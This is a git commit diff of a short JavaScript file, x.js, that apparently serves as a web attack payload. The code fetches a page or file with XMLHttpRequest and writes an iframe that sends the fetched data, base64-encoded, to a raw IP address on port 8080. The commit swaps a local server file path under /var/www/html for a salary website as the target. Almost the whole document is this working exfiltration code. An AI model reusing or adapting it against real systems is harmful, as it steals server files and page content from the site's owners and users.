c117f09260ffc013a96094dc77fade906a4dc0ea
lkintheend <lkintheend@gmail.com>
2019-09-20 16:16:26 +0700

    Update x.js

--- x.js
+++ x.js
@@ -4,5 +4,5 @@ document.write('<iframe src="http://34.93.239.168:8080/?a='+b64+'"></iframe>');
 } 
 var req = new XMLHttpRequest(); 
 req.addEventListener("load", reqListener); 
-req.open("GET", "file:///var/www/html/topdev_salary/card.php"); 
+req.open("GET", "https://salary.topdev.vn"); 
 req.send();
